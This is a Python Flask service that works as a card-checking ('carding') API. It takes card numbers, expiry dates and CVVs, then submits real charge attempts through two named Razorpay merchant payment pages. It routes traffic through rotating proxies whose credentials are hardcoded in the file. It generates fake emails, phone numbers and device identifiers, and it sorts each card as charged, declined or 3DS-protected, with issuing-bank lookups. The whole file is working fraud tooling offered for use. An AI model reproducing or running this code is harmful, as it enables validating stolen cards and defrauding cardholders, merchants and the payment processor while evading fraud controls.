from flask import Flask, request, jsonify
import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
from urllib.parse import quote
import os
import traceback
import threading

urllib3.disable_warnings()

app = Flask(__name__)

# Configuration
MAX_RETRIES = 2
WORKERS = 50

# Only 2 payment pages
PAYMENT_PAGES = [
    "https://razorpay.me/@innatemind",
    "https://razorpay.me/@iiecm"
]

# Proxies
PROXY_LIST_RAW = [
    "38.154.203.95:5863:wdafupmw:gep9pikf53l7",
    "198.105.121.200:6462:wdafupmw:gep9pikf53l7",
    "64.137.96.74:6641:wdafupmw:gep9pikf53l7",
    "209.127.138.10:5784:wdafupmw:gep9pikf53l7",
    "38.154.185.97:6370:wdafupmw:gep9pikf53l7",
    "84.247.60.125:6095:wdafupmw:gep9pikf53l7",
    "142.111.67.146:5611:wdafupmw:gep9pikf53l7",
    "191.96.254.138:6185:wdafupmw:gep9pikf53l7",
    "31.58.9.4:6077:wdafupmw:gep9pikf53l7",
    "104.239.107.47:5699:wdafupmw:gep9pikf53l7"
]

def parse_proxy(proxy_string):
    """Parse proxy string to dictionary format"""
    try:
        parts = proxy_string.split(':')
        if len(parts) == 4:
            host, port, username, password = parts
            proxy_url = f"http://{username}:{password}@{host}:{port}"
            return {
                "http": proxy_url,
                "https": proxy_url
            }
    except:
        pass
    return None

def check_proxy_working(proxy_dict):
    """Check if proxy is working"""
    try:
        test_session = requests.Session()
        test_session.verify = False
        test_session.proxies = proxy_dict
        test_session.timeout = 10
        response = test_session.get("https://api.razorpay.com/v1/checkout/public", timeout=10)
        return response.status_code == 200
    except:
        return False

# Initialize working proxies
WORKING_PROXIES = []
print("🔍 Checking proxies...")
for proxy_str in PROXY_LIST_RAW:
    proxy_dict = parse_proxy(proxy_str)
    if proxy_dict:
        if check_proxy_working(proxy_dict):
            WORKING_PROXIES.append(proxy_dict)
            print(f"✅ Proxy working: {proxy_str.split(':')[0]}")
        else:
            print(f"❌ Proxy dead: {proxy_str.split(':')[0]}")
    else:
        print(f"⚠️ Invalid proxy format: {proxy_str}")

print(f"\n📊 Total working proxies: {len(WORKING_PROXIES)}/{len(PROXY_LIST_RAW)}")

# Thread local storage
thread_local = threading.local()

def get_session():
    """Get thread-local session with proxy rotation"""
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
        thread_local.session.verify = False
        
        # Assign random working proxy
        if WORKING_PROXIES:
            proxy = random.choice(WORKING_PROXIES)
            thread_local.session.proxies = proxy
            
    return thread_local.session

def find_between(content, start, end):
    try:
        s = content.index(start) + len(start)
        e = content.index(end, s)
        return content[s:e]
    except ValueError:
        return ""

def get_card_brand(card_number):
    if card_number.startswith("4"): return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"): return "mastercard"
    elif card_number[:2] in ("34", "37"): return "amex"
    else: return "unknown"

def get_bin_details(bin_number):
    """Get BIN details from binlist.net"""
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
        if response.status_code == 200:
            bin_data = response.json()
            return {
                "scheme": bin_data.get("scheme", "unknown"),
                "type": bin_data.get("type", "unknown"),
                "brand": bin_data.get("brand", "unknown"),
                "country": bin_data.get("country", {}).get("name", "unknown"),
                "country_code": bin_data.get("country", {}).get("alpha2", "unknown"),
                "currency": bin_data.get("country", {}).get("currency", "unknown"),
                "bank": bin_data.get("bank", {}).get("name", "unknown")
            }
    except:
        pass
    return {
        "scheme": "unknown",
        "type": "unknown", 
        "brand": "unknown",
        "country": "unknown",
        "country_code": "unknown",
        "currency": "unknown",
        "bank": "unknown"
    }

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 12)))
    return f"{username}@gmail.com"

def generate_random_phone():
    return f"+91{''.join(random.choices(string.digits, k=10))}"

def analyze_payment_result(response_json, status_code):
    """Analyze payment result to determine real status"""
    
    result = {
        "payment_status": "unknown",
        "card_status": "unknown",
        "message": "",
        "requires_3ds": False
    }
    
    # Check for error responses
    if "error" in response_json:
        error = response_json["error"]
        error_code = error.get("code", "")
        error_desc = error.get("description", "").lower()
        error_reason = error.get("reason", "").lower()
        
        result["payment_status"] = "declined"
        
        # Categorize decline reasons
        if "insufficient" in error_desc or "insufficient" in error_reason:
            result["card_status"] = "insufficient_funds"
            result["message"] = "Insufficient funds in card"
        elif "expired" in error_desc or "expired" in error_reason:
            result["card_status"] = "expired_card"
            result["message"] = "Card has expired"
        elif "cvv" in error_desc or "cvv" in error_reason:
            result["card_status"] = "invalid_cvv"
            result["message"] = "Invalid CVV"
        elif "blocked" in error_desc or "blocked" in error_reason:
            result["card_status"] = "blocked_card"
            result["message"] = "Card is blocked"
        elif "limit" in error_desc or "limit" in error_reason:
            result["card_status"] = "limit_exceeded"
            result["message"] = "Card limit exceeded"
        elif "risk" in error_desc or "risk" in error_reason:
            result["card_status"] = "risk_check_failed"
            result["message"] = "Risk check failed"
        else:
            result["card_status"] = "generic_decline"
            result["message"] = error_desc.capitalize()
        
        return result
    
    # Check for 3DS redirect
    if response_json.get("redirect") == True or response_json.get("type") == "redirect":
        result["payment_status"] = "pending"
        result["card_status"] = "3ds_required"
        result["requires_3ds"] = True
        result["message"] = "3D Secure authentication required"
        return result
    
    # Check for successful payment
    if "id" in response_json or "payment_id" in response_json:
        payment_status = response_json.get("status", "")
        
        if payment_status == "captured":
            result["payment_status"] = "success"
            result["card_status"] = "charged"
            result["message"] = "Payment successfully captured"
        elif payment_status == "authorized":
            result["payment_status"] = "success"
            result["card_status"] = "authorized"
            result["message"] = "Payment authorized successfully"
        else:
            result["payment_status"] = "success"
            result["card_status"] = "processed"
            result["message"] = "Payment processed"
        
        return result
    
    # Check for bank timeout or technical issues
    if status_code >= 500:
        result["payment_status"] = "error"
        result["card_status"] = "technical_error"
        result["message"] = "Bank technical error or timeout"
        return result
    
    return result

@app.route('/razorpay/<path:cc_data>', methods=['GET', 'POST'])
def process_payment(cc_data):
    try:
        cc_parts = cc_data.split("|")
        if len(cc_parts) < 4:
            return jsonify({
                "status": "error",
                "message": "Invalid card format. Use: card|mm|yy|cvv"
            }), 400
        
        cc = cc_parts[0].strip()
        mm = cc_parts[1].strip().zfill(2)
        yy = cc_parts[2].strip()[-2:]
        cvv = cc_parts[3].strip()
        year = int("20" + yy)
        
        amount = int(request.args.get('amount', 100))
        email = request.args.get('email', generate_random_email())
        phone = request.args.get('phone', generate_random_phone())
        
        # Get BIN details
        bin_number = cc[:8]  # First 8 digits for better accuracy
        bin_details = get_bin_details(bin_number)
        
        # Try both pages
        for url in PAYMENT_PAGES:
            try:
                print(f"\n🔄 Trying: {url}")
                
                brand = get_card_brand(cc)
                h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
                ts = str(int(time.time() * 1000))
                rnd = str(random.randrange(10**8)).zfill(8)
                rzp_device_id = f"1.{h}.{ts}.{rnd}"
                BASE62 = string.ascii_letters + string.digits
                rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
                ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
                BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
                
                session = get_session()
                
                # Step 1: Get initial page data
                resp_init = session.get(url, timeout=30)
                if resp_init.status_code != 200:
                    continue
                    
                json_text = re.search(r'var data = ({.*?});', resp_init.text, re.DOTALL)
                if not json_text:
                    continue
                
                init_data = json.loads(json_text.group(1))
                kyid = init_data["key_id"]
                plink = init_data["payment_link"]["id"]
                ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
                keyless_header = init_data.get("keyless_header", "")
                
                # Step 2: Create order
                headers_order = {
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'Origin': 'https://pages.razorpay.com',
                    'Referer': 'https://pages.razorpay.com/',
                    'User-Agent': ua,
                }
                
                json_order = {
                    'line_items': [{'payment_page_item_id': ppid, 'amount': amount}],
                    'notes': {
                        'membership_id': 'Hsjwj',
                        'member_name': 'Sam altamn',
                        'email': email,
                        'contact_number': phone,
                    },
                }
                
                resp_order = session.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order", 
                                          headers=headers_order, json=json_order, timeout=30)
                
                if resp_order.status_code != 200:
                    continue
                    
                order_data = json.loads(resp_order.text)
                order_id = order_data["order"]["id"]
                checkout_id = order_id.split("_")[1]
                
                # Step 3: Get public checkout
                headers_public = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                    'Referer': 'https://pages.razorpay.com/',
                    'User-Agent': ua,
                }
                
                params_public = {
                    'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
                    'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
                    'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
                }
                
                resp_public = session.get('https://api.razorpay.com/v1/checkout/public', 
                                          params=params_public, headers=headers_public, timeout=30)
                
                sessid = find_between(resp_public.text, 'window.session_token="', '";')
                if not sessid:
                    m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', resp_public.text)
                    if m: 
                        sessid = m.group(1)
                
                if not sessid:
                    continue
                
                # Step 4: Create payment
                headers_create = {
                    'Accept': '*/*', 
                    'Content-type': 'application/x-www-form-urlencoded',
                    'User-Agent': ua, 
                    'x-session-token': sessid,
                }
                
                params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
                
                data_create = {
                    'email': email,
                    'contact': phone, 
                    'amount': amount,
                    'currency': 'INR',
                    'order_id': order_id, 
                    'method': 'card', 
                    'card[number]': cc,
                    'card[cvv]': cvv, 
                    'card[name]': 'Hell King', 
                    'card[expiry_month]': mm, 
                    'card[expiry_year]': year,
                    'save_card': '0',
                    'payment_link_id': plink,
                    'key_id': kyid,
                }
                
                resp_create = session.post('https://api.razorpay.com/v1/standard_checkout/payments/create/ajax', 
                                           params=params_create, headers=headers_create, data=data_create, 
                                           timeout=30)
                
                if not resp_create.text:
                    continue
                
                pay_json = json.loads(resp_create.text)
                payment_id = pay_json.get("payment_id") or pay_json.get("id")
                
                # Analyze the result
                analysis = analyze_payment_result(pay_json, resp_create.status_code)
                
                # Prepare final response (clean version)
                response_data = {
                    "status": analysis["payment_status"],
                    "message": analysis["message"],
                    "amount": amount,
                    "card_details": {
                        "bin": cc[:6],
                        "last4": cc[-4:],
                        "scheme": bin_details["scheme"],
                        "type": bin_details["type"],
                        "brand": bin_details["brand"],
                        "country": bin_details["country"],
                        "bank": bin_details["bank"]
                    }
                }
                
                # Add 3DS info if needed (without auth_url)
                if analysis.get("requires_3ds"):
                    response_data["status"] = "3ds_required"
                    response_data["message"] = "3D Secure OTP required - Check your bank app"
                
                # Add decline reason
                if analysis["payment_status"] == "declined":
                    response_data["decline_reason"] = analysis["card_status"]
                
                # Add order and payment IDs only if needed
                if payment_id:
                    response_data["payment_id"] = payment_id
                if order_id:
                    response_data["order_id"] = order_id
                
                return jsonify(response_data)
                
            except Exception as e:
                print(f"Error with {url}: {str(e)}")
                continue
        
        # If all pages fail
        return jsonify({
            "status": "error",
            "message": "All payment pages failed. Please try again.",
            "amount": amount
        }), 500
            
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/bin/<bin_number>', methods=['GET'])
def get_bin_info(bin_number):
    """Get BIN details only"""
    bin_details = get_bin_details(bin_number[:8])
    return jsonify(bin_details)

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "workers": WORKERS,
        "pages": len(PAYMENT_PAGES),
        "working_proxies": len(WORKING_PROXIES)
    })

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "service": "Razorpay Payment API",
        "version": "6.0 - Clean Response",
        "endpoint": "/razorpay/card|mm|yy|cvv",
        "bin_lookup": "/bin/<bin_number>",
        "example": "/razorpay/4750556113323930|02|29|978",
        "response_format": {
            "status": "success/declined/3ds_required/error",
            "message": "Human readable message",
            "amount": "Amount in INR",
            "card_details": {
                "bin": "First 6 digits",
                "last4": "Last 4 digits",
                "scheme": "visa/mastercard",
                "type": "credit/debit",
                "brand": "Card brand",
                "country": "Issuing country",
                "bank": "Issuing bank"
            },
            "payment_id": "Razorpay payment ID (if available)",
            "order_id": "Razorpay order ID (if available)",
            "decline_reason": "Reason for decline (if declined)"
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"\n🚀 Starting Clean API on port {port}")
    print(f"📊 Working proxies: {len(WORKING_PROXIES)}/{len(PROXY_LIST_RAW)}")
    print(f"📄 Payment pages: {PAYMENT_PAGES}")
    app.run(debug=False, host='0.0.0.0', port=port, threaded=True)
